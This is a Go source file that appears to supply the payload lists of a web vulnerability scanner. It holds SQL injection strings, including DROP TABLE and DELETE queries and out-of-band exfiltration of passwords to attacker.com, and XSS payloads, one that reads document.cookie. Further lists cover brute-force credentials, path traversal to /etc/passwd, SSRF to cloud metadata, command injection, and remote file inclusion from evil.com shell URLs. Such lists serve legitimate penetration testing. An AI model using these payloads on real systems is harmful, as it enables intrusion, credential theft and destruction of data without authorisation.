package payloads

// SQLi payloads for testing SQL injection vulnerabilities
var SQLiPayloads = []string{
	// Basic SQLi
	"'",
	"\"",
	"' OR '1'='1",
	"\" OR \"1\"=\"1",
	"' OR '1'='1' --",
	"\" OR \"1\"=\"1\" --",
	"' OR '1'='1' #",
	"' OR '1'='1' /*",
	"admin' --",
	"admin' #",
	"admin'/*",
	"' OR 1=1 --",
	"' OR 'a'='a",
	"') OR ('1'='1",
	"') OR ('a'='a",

	// Union-based
	"' UNION SELECT NULL --",
	"' UNION SELECT NULL,NULL --",
	"' UNION SELECT NULL,NULL,NULL --",
	"' UNION SELECT NULL,NULL,NULL,NULL --",
	"' UNION SELECT NULL,NULL,NULL,NULL,NULL --",
	"' UNION SELECT 1,2,3 --",
	"' UNION SELECT 1,2,3,4 --",
	"' UNION SELECT 1,2,3,4,5 --",
	"' UNION SELECT @@version --",
	"' UNION SELECT user() --",
	"' UNION SELECT database() --",

	// Boolean-based blind
	"' AND '1'='1",
	"' AND '1'='2",
	"' AND 1=1 --",
	"' AND 1=2 --",
	"' AND 'a'='a' AND '",
	"' AND 'a'='b' AND '",

	// Time-based blind
	"' OR SLEEP(5) --",
	"' OR pg_sleep(5) --",
	"' WAITFOR DELAY '0:0:5' --",
	"' AND SLEEP(5) --",
	"' AND pg_sleep(5) --",

	// Stacked queries
	"'; DROP TABLE users --",
	"'; DELETE FROM users --",
	"'; INSERT INTO users VALUES('hacker','pass') --",
	"'; UPDATE users SET password='hacked' --",

	// Error-based
	"' AND extractvalue(1,concat(0x7e,database())) --",
	"' AND updatexml(1,concat(0x7e,database()),1) --",
	"' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",

	// Out-of-band
	"' OR LOAD_FILE(CONCAT('\\\\',database(),'.attacker.com\\\\a')) --",
	"' OR (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\\\a'))) --",
}

// XSS payloads for testing Cross-Site Scripting vulnerabilities
var XSSPayloads = []string{
	// Basic XSS
	"<script>alert(1)</script>",
	"<script>alert('XSS')</script>",
	"<script>prompt(1)</script>",
	"<script>confirm(1)</script>",
	"<script>console.log(1)</script>",

	// IMG-based
	"<img src=x onerror=alert(1)>",
	"<img src=x onerror=alert('XSS')>",
	"<img src=x onerror=prompt(1)>",
	"<img src=1 onerror=alert(1)>",
	"<img src=x onerror=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>",

	// SVG-based
	"<svg onload=alert(1)>",
	"<svg/onload=alert(1)>",
	"<svg><script>alert(1)</script></svg>",
	"<svg onload=prompt(1)>",

	// Event handlers
	"<body onload=alert(1)>",
	"<input onfocus=alert(1) autofocus>",
	"<select onfocus=alert(1) autofocus>",
	"<textarea onfocus=alert(1) autofocus>",
	"<marquee onstart=alert(1)>",
	"<details open ontoggle=alert(1)>",

	// JavaScript URI
	"javascript:alert(1)",
	"javascript:alert('XSS')",
	"JaVaScRiPt:alert(1)",

	// Encoded variants
	"%3Cscript%3Ealert(1)%3C/script%3E",
	"%3Cimg%20src=x%20onerror=alert(1)%3E",
	"&lt;script&gt;alert(1)&lt;/script&gt;",
	"\\x3Cscript\\x3Ealert(1)\\x3C/script\\x3E",

	// DOM-based
	"#<script>alert(1)</script>",
	"javascript:void(document.cookie='test')",
	"'-alert(1)-'",
	"\";alert(1);//",

	// Polyglot
	"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
	"'>><marquee><h1>XSS</h1></marquee>",
	"</script><script>alert(1)</script>",

	// Advanced bypasses
	"<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
	"<script>setTimeout('alert(1)',0)</script>",
	"<script>Function('alert(1)')()</script>",
}

// Common usernames for brute force
var CommonUsernames = []string{
	"admin", "administrator", "root", "user", "test",
	"guest", "info", "adm", "mysql", "oracle",
	"manager", "webmaster", "support", "sa", "postgres",
}

// Common passwords for brute force
var CommonPasswords = []string{
	"admin", "password", "123456", "12345678", "123456789",
	"12345", "1234", "1234567890", "qwerty", "abc123",
	"password123", "admin123", "letmein", "welcome", "monkey",
	"dragon", "master", "login", "starwars", "iloveyou",
	"trustno1", "sunshine", "princess", "football", "baseball",
	"passw0rd", "P@ssw0rd", "Admin@123", "root", "toor",
}

// Directory traversal payloads
var PathTraversalPayloads = []string{
	"../../../etc/passwd",
	"../../../../etc/passwd",
	"../../../../../etc/passwd",
	"..\\..\\..\\windows\\win.ini",
	"..%2F..%2F..%2Fetc%2Fpasswd",
	"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
	"....//....//....//etc/passwd",
	"..;/..;/..;/etc/passwd",
	"/etc/passwd",
	"C:\\Windows\\System32\\drivers\\etc\\hosts",
}

// SSRF payloads for testing Server-Side Request Forgery
var SSRFPayloads = []string{
	"http://127.0.0.1",
	"http://localhost",
	"http://0.0.0.0",
	"http://[::1]",
	"http://169.254.169.254/latest/meta-data/",
	"http://169.254.169.254/latest/user-data/",
	"http://metadata.google.internal/",
	"file:///etc/passwd",
	"file:///C:/Windows/System32/drivers/etc/hosts",
	"gopher://127.0.0.1:25/_HELO%20localhost",
	"dict://127.0.0.1:11211/",
	"http://localhost:22",
	"http://localhost:3306",
	"http://localhost:6379",
	"http://localhost:8080",
	"http://localhost:9200",
}

// Command injection payloads
var CommandInjectionPayloads = []string{
	";id",
	"|id",
	"&&id",
	"||id",
	"`id`",
	"$(id)",
	";cat /etc/passwd",
	"|cat /etc/passwd",
	";whoami",
	"|whoami",
	"&dir&",
	"|dir",
	"$(whoami)",
	"`whoami`",
	";uname -a",
}

// File inclusion payloads
var FileInclusionPayloads = []string{
	// LFI
	"/etc/passwd",
	"C:\\Windows\\System32\\drivers\\etc\\hosts",
	"/proc/self/environ",
	"/var/log/apache2/access.log",
	"/var/log/nginx/access.log",
	"php://filter/convert.base64-encode/resource=index.php",
	"php://filter/read=convert.base64-encode/resource=index.php",
	"php://input",
	"data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",

	// RFI
	"http://evil.com/shell.txt",
	"https://evil.com/shell.php",
	"ftp://evil.com/shell.txt",
}

// HTTP method payloads for method testing
var HTTPMethods = []string{
	"GET", "POST", "PUT", "DELETE", "PATCH",
	"OPTIONS", "HEAD", "TRACE", "CONNECT",
}

// Common file/directory names for scanner
var CommonDirectories = []string{
	"admin", "backup", "config", "css", "db",
	"debug", "demo", "dev", "docs", "download",
	"files", "images", "img", "include", "js",
	"lib", "login", "logs", "old", "phpmyadmin",
	"private", "scripts", "sql", "src", "static",
	"temp", "test", "tmp", "upload", "vendor",
	".git", ".svn", ".env", ".htaccess",
	"wp-admin", "wp-content", "wp-includes",
	"administrator", "api", "app", "assets",
}

var CommonFiles = []string{
	"robots.txt", "sitemap.xml", ".env", ".git/config",
	"crossdomain.xml", "clientaccesspolicy.xml",
	"phpinfo.php", "info.php", "test.php",
	"admin.php", "login.php", "config.php",
	"wp-login.php", "wp-config.php",
	"web.config", "web.xml",
	".DS_Store", "README.md",
	"composer.json", "package.json",
	"server-status", "server-info",
}
